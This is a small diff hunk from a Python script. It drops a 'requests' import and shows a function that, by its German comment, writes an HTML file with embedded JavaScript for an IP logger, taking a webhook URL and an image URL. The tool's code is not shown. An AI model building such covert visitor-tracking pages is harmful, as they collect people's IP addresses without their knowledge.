@@ -2,7 +2,6 @@ import http.server
 import socketserver
 import threading
 import webbrowser
-import requests
 
 def create_html_file(webhook_url, image_url):
     # HTML-Inhalt mit eingebettetem JavaScript für den IP-Logger
